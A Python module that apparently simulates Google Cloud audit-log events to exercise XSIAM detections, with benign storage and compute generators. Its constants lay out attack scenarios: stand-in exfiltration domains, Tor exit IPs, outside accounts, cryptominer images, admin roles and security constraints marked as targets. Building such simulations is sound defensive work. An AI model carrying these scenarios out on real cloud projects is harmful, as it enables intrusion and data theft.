import json
import datetime
import random
import uuid
import time
import logging
from ipaddress import ip_network, ip_address

# --- Module Metadata ---
NAME = "Google Cloud Compute"
DESCRIPTION = "Simulates GCP Cloud Audit Log events to trigger XSIAM analytics."
XSIAM_VENDOR = "Google Cloud"
XSIAM_PRODUCT = "Cloud Audit Logs"
CONFIG_KEY = "gcp_config"
last_threat_event_time = 0


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

_GCP_REGIONS = [
    "us-central1", "us-east1", "us-east4", "us-west1", "us-west2",
    "europe-west1", "europe-west2", "europe-west4",
    "asia-east1", "asia-southeast1", "northamerica-northeast1",
]

_GCP_ZONES = {
    "us-central1":          ["us-central1-a", "us-central1-b", "us-central1-c", "us-central1-f"],
    "us-east1":             ["us-east1-b", "us-east1-c", "us-east1-d"],
    "us-east4":             ["us-east4-a", "us-east4-b", "us-east4-c"],
    "us-west1":             ["us-west1-a", "us-west1-b", "us-west1-c"],
    "us-west2":             ["us-west2-a", "us-west2-b", "us-west2-c"],
    "europe-west1":         ["europe-west1-b", "europe-west1-c", "europe-west1-d"],
    "europe-west2":         ["europe-west2-a", "europe-west2-b", "europe-west2-c"],
    "europe-west4":         ["europe-west4-a", "europe-west4-b", "europe-west4-c"],
    "asia-east1":           ["asia-east1-a", "asia-east1-b", "asia-east1-c"],
    "asia-southeast1":      ["asia-southeast1-a", "asia-southeast1-b", "asia-southeast1-c"],
    "northamerica-northeast1": ["northamerica-northeast1-a", "northamerica-northeast1-b", "northamerica-northeast1-c"],
}

_USER_AGENTS = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "google-cloud-sdk/463.0.0 command/gcloud.compute.instances.list invocation-id/abc123 environment/None environment-version/None interactive/True from-script/False",
    "google-cloud-sdk/461.0.0 command/gcloud.storage.ls invocation-id/def456 environment/None environment-version/None interactive/True from-script/False",
    "google-cloud-sdk/458.0.1 command/gcloud.iam.service-accounts.list invocation-id/ghi789 environment/GCE environment-version/None interactive/False from-script/True",
    "Terraform/1.6.4 (+https://www.terraform.io) terraform-provider-google/5.8.0",
    "python-requests/2.31.0",
    "google-api-python-client/2.108.0 (gzip)",
    "Go-http-client/2.0",
    "apitools-client/0.5.32 (Linux 5.15.0) Python/3.10 google-cloud-storage/2.13.0",
    "google-cloud-go/0.110.0 (go1.21.0; linux/amd64)",
]

_EXTERNAL_IP_FIRST_OCTETS = [45, 52, 54, 62, 80, 91, 104, 142, 176, 185, 193, 194, 212, 213]

_TOR_EXIT_FALLBACK = [
    "185.220.101.34", "185.220.101.35", "185.220.101.36", "185.220.101.37",
    "45.66.33.45", "176.10.104.240", "199.249.230.87", "162.247.74.74",
    "23.129.64.100", "104.244.74.1", "141.255.160.110", "192.42.116.16",
]

# GCP gRPC/RPC status codes (google.rpc.Code)
_STATUS_CODE_OK = 0
_STATUS_CODE_PERMISSION_DENIED = 7
_STATUS_CODE_NOT_FOUND = 5
_STATUS_CODE_ALREADY_EXISTS = 6

# Log name suffixes
_LOG_ACTIVITY   = "cloudaudit.googleapis.com%2Factivity"
_LOG_DATA_ACCESS = "cloudaudit.googleapis.com%2Fdata_access"

_AUDIT_LOG_TYPE = "type.googleapis.com/google.cloud.audit.AuditLog"

# External "attacker" domains used in threat scenarios
_ATTACKER_DOMAINS = [
    "evil-corp.com", "exfil-staging.net", "remote-access.xyz",
    "shadow-infra.io", "adversary-project.dev",
]

# External gmail/protonmail/outlook accounts used for EXTERNAL_USER_ADDED threat
_EXTERNAL_GMAIL_ACCOUNTS = [
    "attacker.research42@gmail.com", "external.pivot88@gmail.com",
    "shadow.user2025@gmail.com", "temp.access99@outlook.com",
    "recon.account@protonmail.com",
]

# Security org policy constraints targeted in ORG_POLICY_MODIFY threat
_SECURITY_CONSTRAINTS = [
    "constraints/compute.requireOsLogin",
    "constraints/iam.disableServiceAccountKeyCreation",
    "constraints/compute.restrictCloudArmorFeatures",
    "constraints/gcp.resourceLocations",
    "constraints/compute.requireShieldedVm",
]

# Gemini / Vertex AI model resource path suffixes
_GEMINI_MODELS = [
    "publishers/google/models/gemini-1.5-pro-002",
    "publishers/google/models/gemini-1.5-flash-002",
    "publishers/google/models/gemini-2.0-flash",
    "publishers/google/models/text-bison@002",
]

# Legitimate Vertex AI training container images
_VERTEX_CONTAINER_IMAGES = [
    "us-docker.pkg.dev/vertex-ai/training/tf-gpu.2-12.py310:latest",
    "us-docker.pkg.dev/vertex-ai/training/pytorch-gpu.2-0.py310:latest",
    "us-docker.pkg.dev/vertex-ai/prediction/sklearn-cpu.1-0:latest",
]

# Suspicious container images used in VERTEX_TRAINING_MALICIOUS threat
_SUSPICIOUS_CONTAINER_IMAGES = [
    "docker.io/attacker/cryptominer:latest",
    "ghcr.io/unknown-org/model-backdoor:v2",
    "registry.hub.docker.com/malicious/exfil-trainer:latest",
]

# Model Armor safety template IDs (model IDs only — full path built at runtime)
_MODEL_ARMOR_TEMPLATE_IDS = [
    "pii-block",
    "jailbreak-prevention",
    "toxic-content-filter",
]

# Highly privileged admin roles used in threat IAM scenarios
_ADMIN_ROLES = [
    "roles/owner",
    "roles/iam.securityAdmin",
    "roles/resourcemanager.organizationAdmin",
    "roles/iam.organizationRoleAdmin",
    "roles/resourcemanager.projectIamAdmin",
    "roles/iam.serviceAccountAdmin",
    "roles/iam.serviceAccountKeyAdmin",
    "roles/iam.serviceAccountTokenCreator",
]

# Sensitive Cloud Functions roles
_FUNCTIONS_SENSITIVE_ROLES = [
    "roles/cloudfunctions.admin",
    "roles/cloudfunctions.invoker",
    "roles/run.admin",
    "roles/run.invoker",
]

# Group identity suffixes for group: member format
_CORP_GROUP_PREFIXES = [
    "all-employees", "all-engineers", "dev-team", "ops-team",
    "data-scientists", "sre-oncall", "contractors",
]


# ---------------------------------------------------------------------------
# Helper Functions
# ---------------------------------------------------------------------------

def _get_threat_interval(threat_level, config):
    """Returns seconds between threat events based on threat level."""
    if threat_level == "Benign Traffic Only":
        return 86400 * 365
    levels = config.get('threat_generation_levels', {})
    return levels.get(threat_level, 7200)


def _gcp_timestamp(offset_seconds=0):
    """Return RFC3339 timestamp with nanosecond precision (GCP standard)."""
    now = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(seconds=offset_seconds)
    ns = now.microsecond * 1000 + random.randint(0, 999)
    return now.strftime('%Y-%m-%dT%H:%M:%S.') + f"{ns:09d}Z"


def _gcp_receive_timestamp(offset_seconds=0):
    """Return receive timestamp (slightly after event timestamp) with nanosecond precision."""
    now = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(seconds=offset_seconds + random.uniform(0.05, 0.5))
    ns = now.microsecond * 1000 + random.randint(0, 999)
    return now.strftime('%Y-%m-%dT%H:%M:%S.') + f"{ns:09d}Z"


def _random_insert_id():
    """Generate a GCP-style insertId (alphanumeric, ~20 chars)."""
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    return ''.join(random.choices(chars, k=random.randint(18, 22)))


def _random_user_agent():
    return random.choice(_USER_AGENTS)


def _random_external_ip():
    """Generate a realistic external IP address."""
    first = random.choice(_EXTERNAL_IP_FIRST_OCTETS)
    return f"{first}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"


def _random_region(config):
    gcp_conf = config.get(CONFIG_KEY, {})
    regions = gcp_conf.get('gcp_regions', _GCP_REGIONS)
    return random.choice(regions)


def _random_zone(region=None):
    if region and region in _GCP_ZONES:
        return random.choice(_GCP_ZONES[region])
    all_zones = [z for zlist in _GCP_ZONES.values() for z in zlist]
    return random.choice(all_zones)


def _get_project_id(config):
    gcp_conf = config.get(CONFIG_KEY, {})
    return gcp_conf.get('gcp_project_id', 'PLACEHOLDER_GCP_PROJECT_ID')


def _get_random_principal(config, context=None, force_service_account=False):
    """
    Pick a principal (email) for the audit log.
    Prefers session_context users; falls back to gcp_config.service_accounts.
    Returns a dict with keys: email, display_name, caller_ip, is_service_account
    """
    from modules.session_utils import get_random_user

    session_context = (context or {}).get('session_context')

    # Try session_context first (real users from user_profiles)
    if session_context and not force_service_account:
        user = get_random_user(session_context)
        if user:
            # Prefer gcp_iam_user if set, otherwise use email
            email = user.get('gcp_iam_user') or user.get('email') or f"{user['username']}@examplecorp.com"
            return {
                'email':              email,
                'display_name':       user.get('display_name', user['username']),
                'caller_ip':          user.get('ip') or _random_external_ip(),
                'is_service_account': False,
            }

    # Fall back to service accounts from gcp_config
    gcp_conf = config.get(CONFIG_KEY, {})
    sa_list = gcp_conf.get('service_accounts', [])
    if sa_list:
        sa_email = random.choice(sa_list)
        return {
            'email':              sa_email,
            'display_name':       sa_email,
            'caller_ip':          _random_external_ip(),
            'is_service_account': True,
        }

    # Last resort fallback
    project_id = _get_project_id(config)
    return {
        'email':              f"default-sa@{project_id}.iam.gserviceaccount.com",
        'display_name':       'Default Service Account',
        'caller_ip':          _random_external_ip(),
        'is_service_account': True,
    }


def _get_random_sa(config):
    """Pick a service account email from config."""
    gcp_conf = config.get(CONFIG_KEY, {})
    sa_list = gcp_conf.get('service_accounts', [])
    if sa_list:
        return random.choice(sa_list)
    project_id = _get_project_id(config)
    return f"compute-engine@{project_id}.iam.gserviceaccount.com"


def _get_random_sa_excluding(config, exclude_email):
    """Pick a SA email from config that is NOT exclude_email (caller != target guard)."""
    gcp_conf  = config.get(CONFIG_KEY, {})
    sa_list   = gcp_conf.get('service_accounts', [])
    candidates = [sa for sa in sa_list if sa != exclude_email]
    if candidates:
        return random.choice(candidates)
    # Fallback: synthesise a name that can't collide with any real config SA
    project_id = _get_project_id(config)
    return f"privileged-workload-sa@{project_id}.iam.gserviceaccount.com"


def _get_serverless_sa(config):
    """
    Return a service account email in a GCP serverless-service domain.

    XSIAM's "CLI from serverless compute service" detector identifies serverless
    tokens by matching the principalEmail domain against system-assigned patterns:
      - PROJECT_NUMBER-compute@developer.gserviceaccount.com  (Cloud Run / CF 2nd gen)
      - PROJECT_ID@appspot.gserviceaccount.com                (CF 1st gen / App Engine)
      - PROJECT_NUMBER@cloudbuild.gserviceaccount.com         (Cloud Build)

    Uses config key gcp_config.serverless_service_accounts; falls back to
    synthesising from the project's account_id and project_id.
    """
    gcp_conf = config.get(CONFIG_KEY, {})
    sa_list  = gcp_conf.get('serverless_service_accounts', [])
    if sa_list:
        return random.choice(sa_list)
    # Fallback: build from account_id (project number) and project_id
    project_id  = _get_project_id(config)
    project_num = config.get('account_id', '123456789012')
    return random.choice([
        f"{project_num}-compute@developer.gserviceaccount.com",
        f"{project_id}@appspot.gserviceaccount.com",
        f"{project_num}@cloudbuild.gserviceaccount.com",
    ])


def _get_tor_ip(config):
    """Return a Tor exit node IP from config or fallback list."""
    tor_nodes = config.get('tor_exit_nodes', [])
    if tor_nodes:
        return random.choice(tor_nodes)['ip'] if isinstance(tor_nodes[0], dict) else random.choice(tor_nodes)
    return random.choice(_TOR_EXIT_FALLBACK)


def _get_random_gcs_bucket(config):
    gcp_conf = config.get(CONFIG_KEY, {})
    buckets = gcp_conf.get('gcs_buckets', [])
    if buckets:
        return random.choice(buckets)
    return f"{_get_project_id(config)}-default-bucket"


def _get_random_gce_instance(config):
    gcp_conf = config.get(CONFIG_KEY, {})
    instances = gcp_conf.get('gce_instances', [])
    if instances:
        return random.choice(instances)
    return "prod-instance-01"


def _get_random_gke_cluster(config):
    gcp_conf = config.get(CONFIG_KEY, {})
    clusters = gcp_conf.get('gke_clusters', [])
    if clusters:
        return random.choice(clusters)
    return "prod-cluster-us-central1"


def _get_random_bq_dataset(config):
    gcp_conf = config.get(CONFIG_KEY, {})
    datasets = gcp_conf.get('bigquery_datasets', [])
    if datasets:
        return random.choice(datasets)
    return "analytics_prod"


def _get_random_log_sink(config):
    gcp_conf = config.get(CONFIG_KEY, {})
    sinks = gcp_conf.get('log_sinks', [])
    if sinks:
        return random.choice(sinks)
    return "export-to-bq-audit"


def _get_random_secret_id(config, sensitive=False):
    gcp_conf = config.get(CONFIG_KEY, {})
    if sensitive:
        secrets = gcp_conf.get('sensitive_secret_ids', [])
    else:
        project_id = _get_project_id(config)
        all_secrets = gcp_conf.get('sensitive_secret_ids', [])
        non_sensitive = [
            f"projects/{project_id}/secrets/app-config",
            f"projects/{project_id}/secrets/smtp-credentials",
            f"projects/{project_id}/secrets/oauth-client-secret",
        ]
        secrets = non_sensitive + all_secrets
    if secrets:
        return random.choice(secrets)
    project_id = _get_project_id(config)
    return f"projects/{project_id}/secrets/app-secret"


def _get_random_vertex_model(config):
    gcp_conf = config.get(CONFIG_KEY, {})
    models = gcp_conf.get('vertex_ai_models', [])
    if models:
        return random.choice(models)
    project_id = _get_project_id(config)
    return f"projects/{project_id}/locations/us-central1/models/default-model"


def _get_random_vertex_dataset(config):
    gcp_conf = config.get(CONFIG_KEY, {})
    datasets = gcp_conf.get('vertex_ai_datasets', [])
    if datasets:
        return random.choice(datasets)
    project_id = _get_project_id(config)
    return f"projects/{project_id}/locations/us-central1/datasets/default-dataset"


def _get_random_cloud_function(config):
    gcp_conf = config.get(CONFIG_KEY, {})
    functions = gcp_conf.get('cloud_functions', [])
    if functions:
        return random.choice(functions)
    return "process-uploads"


def _get_random_cloud_run_service(config):
    gcp_conf = config.get(CONFIG_KEY, {})
    services = gcp_conf.get('cloud_run_services', [])
    if services:
        return random.choice(services)
    return "api-gateway"


def _get_random_firewall_rule(config):
    gcp_conf = config.get(CONFIG_KEY, {})
    rules = gcp_conf.get('firewall_rules', [])
    if rules:
        return random.choice(rules)
    return "allow-internal"


def _get_random_vpc_network(config):
    gcp_conf = config.get(CONFIG_KEY, {})
    networks = gcp_conf.get('vpc_networks', [])
    if networks:
        return random.choice(networks)
    return "default"


def _get_random_sql_instance(config):
    instances = config.get(CONFIG_KEY, {}).get('cloud_sql_instances', [])
    return random.choice(instances) if instances else "prod-db-01"


def _get_random_kms_keyring(config):
    rings = config.get(CONFIG_KEY, {}).get('kms_keyrings', [])
    return random.choice(rings) if rings else "prod-keyring"


def _get_random_kms_key(config, keyring):
    keys = config.get(CONFIG_KEY, {}).get('kms_keys', {}).get(keyring, [])
    return random.choice(keys) if keys else "default-key"


def _get_random_artifact_registry(config):
    registries = config.get(CONFIG_KEY, {}).get('artifact_registries', [])
    return random.choice(registries) if registries else f"us-central1-docker.pkg.dev/{_get_project_id(config)}/app-images"


def _get_random_spanner_instance(config):
    instances = config.get(CONFIG_KEY, {}).get('spanner_instances', [])
    return random.choice(instances) if instances else "prod-ledger"


def _get_random_cloud_armor_policy(config):
    policies = config.get(CONFIG_KEY, {}).get('cloud_armor_policies', [])
    return random.choice(policies) if policies else "prod-waf-policy"


def _get_random_vertex_endpoint(config):
    endpoints = config.get(CONFIG_KEY, {}).get('vertex_ai_endpoints', [])
    return random.choice(endpoints) if endpoints else f"projects/{_get_project_id(config)}/locations/us-central1/endpoints/1234567890"


def _get_random_vertex_index_endpoint(config):
    endpoints = config.get(CONFIG_KEY, {}).get('vertex_ai_index_endpoints', [])
    return random.choice(endpoints) if endpoints else f"projects/{_get_project_id(config)}/locations/us-central1/indexEndpoints/9876543210"


def _get_random_gemini_model(config):
    p = _get_project_id(config)
    r = _random_region(config)
    return f"projects/{p}/locations/{r}/{random.choice(_GEMINI_MODELS)}"


def _get_model_armor_template(config):
    p = _get_project_id(config)
    r = _random_region(config)
    template_id = random.choice(_MODEL_ARMOR_TEMPLATE_IDS)
    return f"projects/{p}/locations/{r}/templates/{template_id}"


def _get_random_pubsub_topic(config):
    gcp_conf = config.get(CONFIG_KEY, {})
    topics = gcp_conf.get('pubsub_topics', [])
    if topics:
        return random.choice(topics)
    project_id = _get_project_id(config)
    return f"projects/{project_id}/topics/xsiam-audit-logs"


def _get_random_pubsub_subscription(config):
    gcp_conf = config.get(CONFIG_KEY, {})
    subs = gcp_conf.get('pubsub_subscriptions', [])
    if subs:
        return random.choice(subs)
    project_id = _get_project_id(config)
    return f"projects/{project_id}/subscriptions/xsiam-pull-sub"


def _get_serverless_internal_ip():
    """Return a GCP serverless/Cloud Run/Cloud Functions internal caller IP."""
    r = random.random()
    if r < 0.5:
        # RFC 1918 — VPC connector path
        return f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
    elif r < 0.8:
        # GCP internal load-balancer / health-checker range
        return f"35.191.{random.randint(0, 255)}.{random.randint(1, 254)}"
    else:
        # GCP internal network range used by managed services
        return f"130.211.{random.randint(0, 3)}.{random.randint(1, 254)}"


def _get_corp_domain(config):
    """Return the organisation's email domain from session context or a sensible default."""
    users = config.get('session_context', {}).get('users', [])
    for user in users:
        email = user.get('email', '')
        if '@' in email and not email.endswith('.iam.gserviceaccount.com'):
            return email.split('@')[1]
    return "examplecorp.com"


def _build_log_entry(
    project_id,
    principal_email,
    caller_ip,
    service_name,
    method_name,
    resource_name,
    resource_type,
    resource_labels,
    log_type=None,
    status_code=0,
    status_message=None,
    authorization_info=None,
    request_body=None,
    response_body=None,
    service_data=None,
    user_agent=None,
    operation_id=None,
    offset_seconds=0,
):
    """
    Build a GCP Cloud Logging LogEntry dict for an Audit Log event.
    All fields follow the LogEntry + AuditLog proto schema consumed by
    the GoogleCloudLogging XSIAM XIF (GCP_MAP_AUDIT_LOGS rule).
    """
    ts = _gcp_timestamp(offset_seconds)
    rts = _gcp_receive_timestamp(offset_seconds)

    if log_type is None:
        # Mutating methods go to activity; reads go to data_access
        _read_prefixes = (
            "list", "get", "describe", "read", "search",
            "storage.objects.list", "storage.objects.get",
            "datasetservice.list", "jobservice.list",
            "google.monitoring", "dns.managedZones.list",
        )
        lm = method_name.lower()
        is_read = any(lm.startswith(p) or p in lm for p in _read_prefixes)
        log_type = _LOG_DATA_ACCESS if is_read else _LOG_ACTIVITY

    log_name = f"projects/{project_id}/logs/{log_type}"

    severity = "NOTICE"
    if status_code != 0:
        severity = "ERROR"
    elif log_type == _LOG_DATA_ACCESS:
        severity = "INFO"

    # Build default authorizationInfo if not provided
    if authorization_info is None:
        # Derive a plausible permission from the method name
        perm = _method_to_permission(method_name, service_name)
        authorization_info = [
            {
                "resource": resource_name,
                "permission": perm,
                "granted": status_code == _STATUS_CODE_OK,
                "resourceAttributes": {},
            }
        ]

    proto_payload = {
        "@type": _AUDIT_LOG_TYPE,
        "authenticationInfo": {
            "principalEmail": principal_email,
        },
        "requestMetadata": {
            "callerIp":                caller_ip,
            "callerSuppliedUserAgent": user_agent or _random_user_agent(),
        },
        "serviceName":     service_name,
        "methodName":      method_name,
        "resourceName":    resource_name,
        "authorizationInfo": authorization_info,
        "status": {} if status_code == _STATUS_CODE_OK else {
            "code":    status_code,
            "message": status_message or "Permission denied.",
        },
    }

    if request_body is not None:
        proto_payload["request"] = request_body

    if response_body is not None:
        proto_payload["response"] = response_body

    if service_data is not None:
        proto_payload["serviceData"] = service_data

    entry = {
        "insertId":        _random_insert_id(),
        "logName":         log_name,
        "receiveTimestamp": rts,
        "timestamp":       ts,
        "severity":        severity,
        "resource": {
            "type":   resource_type,
            "labels": {**resource_labels, "project_id": project_id},
        },
        "protoPayload": proto_payload,
    }

    if operation_id:
        entry["operation"] = {
            "id":       operation_id,
            "producer": service_name,
            "first":    True,
            "last":     True,
        }

    return entry


def _method_to_permission(method_name, service_name=""):
    """Derive a plausible IAM permission from a method name."""
    lm = method_name.lower()
    sn = service_name.lower()

    # GCS
    if "storage" in sn or "storage" in lm:
        if "list" in lm:   return "storage.objects.list"
        if "create" in lm: return "storage.objects.create"
        if "delete" in lm: return "storage.objects.delete"
        if "setiampolicy" in lm or "setiam" in lm: return "storage.buckets.setIamPolicy"
        return "storage.objects.get"

    # Compute — specific resource checks must come before generic verb checks
    if "compute" in sn or "compute" in lm:
        # Specific resource+action checks first
        if "firewalls.insert" in lm:          return "compute.firewalls.create"
        if "firewalls.delete" in lm:          return "compute.firewalls.delete"
        if "images.insert" in lm:             return "compute.images.create"
        if "images.setiampolicy" in lm:       return "compute.images.setIamPolicy"
        if "routes.insert" in lm:             return "compute.routes.create"
        if "routes.delete" in lm:             return "compute.routes.delete"
        if "securitypolicies.delete" in lm:   return "compute.securityPolicies.delete"
        if "securitypolicies.list" in lm:     return "compute.securityPolicies.list"
        if "snapshots.setiampolicy" in lm:    return "compute.snapshots.setIamPolicy"
        if "networks.addpeering" in lm:       return "compute.networks.addPeering"
        if "subnetworks.patch" in lm:         return "compute.subnetworks.update"
        if "createsnapshot" in lm:            return "compute.disks.createSnapshot"
        if "setmetadata" in lm:               return "compute.instances.setMetadata"
        # Generic verb checks after all specific ones
        if "insert" in lm:                    return "compute.instances.create"
        if "delete" in lm:                    return "compute.instances.delete"
        if "list" in lm:                      return "compute.instances.list"
        if "setiampolicy" in lm:              return "compute.instances.setIamPolicy"
        return "compute.instances.get"

    # IAM deny policies (iam.googleapis.com v2 — must come before generic IAM block)
    if "iam.v2.policies" in lm or ("iam" in sn and "policies" in lm):
        if "create" in lm: return "iam.denypolicies.create"
        if "update" in lm: return "iam.denypolicies.update"
        if "delete" in lm: return "iam.denypolicies.delete"
        return "iam.denypolicies.get"

    # IAM / Resource Manager (match by service name only — "iam" in method is too greedy)
    if "iam.googleapis.com" in sn or "iamcredentials.googleapis.com" in sn or "cloudresourcemanager" in sn:
        if "setiampolicy" in lm or "setiam" in lm:  return "resourcemanager.projects.setIamPolicy"
        if "getiampolicy" in lm or "getiam" in lm:  return "resourcemanager.projects.getIamPolicy"
        if "createserviceaccountkey" in lm:          return "iam.serviceAccountKeys.create"
        if "listserviceaccounts" in lm:              return "iam.serviceAccounts.list"
        if "getserviceaccount" in lm:                return "iam.serviceAccounts.get"
        if "createserviceaccount" in lm:             return "iam.serviceAccounts.create"
        if "deleteserviceaccount" in lm:             return "iam.serviceAccounts.delete"
        if "generateaccesstoken" in lm:              return "iam.serviceAccounts.getAccessToken"
        if "actas" in lm:                            return "iam.serviceAccounts.actAs"
        if "deleteproject" in lm:                    return "resourcemanager.projects.delete"
        return "iam.serviceAccounts.get"

    # BigQuery
    if "bigquery" in sn or "bigquery" in lm:
        if "list" in lm:   return "bigquery.datasets.get"
        if "insert" in lm: return "bigquery.jobs.create"
        if "delete" in lm: return "bigquery.datasets.delete"
        return "bigquery.tables.getData"

    # GKE / Container
    if "container" in sn or "container" in lm:
        if "list" in lm:       return "container.clusters.list"
        if "get" in lm:        return "container.clusters.get"
        if "exec" in lm:       return "container.pods.exec"
        if "portforward" in lm: return "container.pods.portForward"
        return "container.clusters.get"

    # Secret Manager
    if "secretmanager" in sn or "secretmanager" in lm or "accesssecretversion" in lm:
        return "secretmanager.versions.access"

    # Logging
    if "logging" in sn or "logging" in lm:
        if "delete" in lm: return "logging.sinks.delete"
        if "update" in lm: return "logging.sinks.update"
        if "list" in lm:   return "logging.sinks.list"
        return "logging.sinks.get"

    # Security Command Center
    if "securitycenter" in sn or "securitycenter" in lm:
        if "delete" in lm: return "securitycenter.notificationconfigs.delete"
        return "securitycenter.notificationconfigs.update"

    # Vertex AI — granular per-resource permissions
    if "aiplatform" in sn or "aiplatform" in lm:
        if "predictionservice.predict" in lm or "predictionservice.generatecontent" in lm:
            return "aiplatform.endpoints.predict"
        if "jobservice.createcustomjob" in lm:        return "aiplatform.customJobs.create"
        if "jobservice.listcustomjobs" in lm:         return "aiplatform.customJobs.list"
        if "jobservice.createbatchpredictionjob" in lm: return "aiplatform.batchPredictionJobs.create"
        if "modelservice.exportmodel" in lm:          return "aiplatform.models.export"
        if "modelservice.updatemodel" in lm:          return "aiplatform.models.update"
        if "datasetservice.importdata" in lm:         return "aiplatform.datasets.import"
        if "vertexragdataservice.importragfiles" in lm: return "aiplatform.ragCorpora.update"
        if "modelarmorservice.deletemodelarmort" in lm: return "aiplatform.modelArmorTemplates.delete"
        if "delete" in lm: return "aiplatform.models.delete"
        if "list" in lm:   return "aiplatform.models.list"
        return "aiplatform.models.get"

    # Cloud Functions
    if "cloudfunctions" in sn or "cloudfunctions" in lm:
        if "call" in lm:         return "cloudfunctions.functions.call"
        if "create" in lm:       return "cloudfunctions.functions.create"
        if "update" in lm:       return "cloudfunctions.functions.update"
        if "delete" in lm:       return "cloudfunctions.functions.delete"
        if "list" in lm:         return "cloudfunctions.functions.list"
        if "setiampolicy" in lm: return "cloudfunctions.functions.setIamPolicy"
        return "cloudfunctions.functions.get"

    # Cloud Run
    if "run" in sn:
        if "list" in lm:   return "run.services.list"
        if "delete" in lm: return "run.services.delete"
        return "run.services.get"

    # KMS
    if "cloudkms" in sn or "keymanagement" in lm:
        if "list" in lm:    return "cloudkms.keyRings.list"
        if "encrypt" in lm: return "cloudkms.cryptoKeyVersions.useToEncrypt"
        if "destroy" in lm: return "cloudkms.cryptoKeyVersions.destroy"
        return "cloudkms.keyRings.get"

    # Cloud SQL
    if "sqladmin" in sn or ("sql" in sn and "googleapis" in sn):
        if "list" in lm:       return "cloudsql.instances.list"
        if "patch" in lm:      return "cloudsql.instances.update"
        if "ephemeral" in lm:  return "cloudsql.instances.connect"
        return "cloudsql.instances.get"

    # Artifact Registry
    if "artifactregistry" in sn:
        return "artifactregistry.repositories.list" if "list" in lm else "artifactregistry.repositories.get"

    # Cloud Build
    if "cloudbuild" in sn:
        return "cloudbuild.builds.list" if "list" in lm else "cloudbuild.builds.get"

    # Spanner
    if "spanner" in sn:
        return "spanner.instances.list" if "list" in lm else "spanner.instances.get"

    # Dataflow
    if "dataflow" in sn:
        return "dataflow.jobs.list" if "list" in lm else "dataflow.jobs.get"

    # Org Policy
    if "orgpolicy" in sn:
        return "orgpolicy.policies.delete" if "delete" in lm else "orgpolicy.policies.update"

    # Pub/Sub
    if "pubsub" in sn or "pubsub" in lm:
        if "deletesubscription" in lm: return "pubsub.subscriptions.delete"
        if "deletetopic" in lm:        return "pubsub.topics.delete"
        if "listtopics" in lm:         return "pubsub.topics.list"
        if "publish" in lm:            return "pubsub.topics.publish"
        return "pubsub.subscriptions.consume"

    # DNS
    if "dns" in sn:
        if "list" in lm:   return "dns.managedZones.list"
        if "create" in lm: return "dns.managedZones.create"
        if "delete" in lm: return "dns.managedZones.delete"
        return "dns.managedZones.get"

    # Monitoring
    if "monitoring" in sn or "monitoring" in lm:
        if "listtimeseries" in lm: return "monitoring.timeSeries.list"
        if "create" in lm:         return "monitoring.alertPolicies.create"
        if "delete" in lm:         return "monitoring.alertPolicies.delete"
        return "monitoring.timeSeries.list"

    return f"{service_name.split('.')[0]}.resources.get"


# ---------------------------------------------------------------------------
# Benign Event Generators
# ---------------------------------------------------------------------------

def _gen_gcs_list_objects(config, context=None):
    """Benign: List objects in a GCS bucket (data access)."""
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    bucket = _get_random_gcs_bucket(config)
    region = _random_region(config)

    entry = _build_log_entry(
        project_id     = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "storage.googleapis.com",
        method_name     = "storage.objects.list",
        resource_name   = f"projects/_/buckets/{bucket}",
        resource_type   = "gcs_bucket",
        resource_labels = {"bucket_name": bucket, "location": region},
        log_type        = _LOG_DATA_ACCESS,
        request_body    = {"bucket": bucket, "maxResults": str(random.randint(100, 1000))},
        response_body   = {"kind": "storage#objects", "nextPageToken": None},
    )
    return [entry]


def _gen_gcs_get_object(config, context=None):
    """Benign: Download a single GCS object (data access)."""
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    bucket = _get_random_gcs_bucket(config)
    region = _random_region(config)
    obj_name = random.choice([
        "exports/report-2024-q4.csv", "backups/db-snapshot.tar.gz",
        "artifacts/app-v2.3.0.jar", "configs/prod-config.yaml",
        "data/ml-training-set.jsonl",
    ])

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "storage.googleapis.com",
        method_name     = "storage.objects.get",
        resource_name   = f"projects/_/buckets/{bucket}/objects/{obj_name}",
        resource_type   = "gcs_bucket",
        resource_labels = {"bucket_name": bucket, "location": region},
        log_type        = _LOG_DATA_ACCESS,
        request_body    = {"bucket": bucket, "object": obj_name},
    )
    return [entry]


def _gen_gcs_put_object(config, context=None):
    """Benign: Upload a file to GCS (data access — create)."""
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    bucket = _get_random_gcs_bucket(config)
    region = _random_region(config)
    obj_name = random.choice([
        "uploads/user-file.pdf", "exports/weekly-summary.xlsx",
        "artifacts/deploy-package.zip", "data/ingestion-batch.json",
    ])

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "storage.googleapis.com",
        method_name     = "storage.objects.create",
        resource_name   = f"projects/_/buckets/{bucket}/objects/{obj_name}",
        resource_type   = "gcs_bucket",
        resource_labels = {"bucket_name": bucket, "location": region},
        log_type        = _LOG_DATA_ACCESS,
        request_body    = {"bucket": bucket, "name": obj_name, "contentType": "application/octet-stream"},
    )
    return [entry]


def _gen_compute_list_instances(config, context=None):
    """Benign: List GCE instances (data access)."""
    p = _get_random_principal(config, context)
    project_id = _get_project_id(config)
    region = _random_region(config)
    zone = _random_zone(region)

    entry = _build_log_entry(
        project_id      = project_id,
        principal_email = p['email'],
        caller_ip       = p['caller_ip'],
        service_name    = "compute.googleapis.com",
        method_name     = "v1.compute.instances.list",
        resource_name   = f"projects/{project_id}/zones/{zone}",
        resource_type   = "gce_instance",
        resource_labels = {"zone": zone, "instance_id": ""},
        log_type        = _LOG_DATA_ACCESS,
        request_body    = {"project": project_id, "zone": zone},
    )
    return [entry]


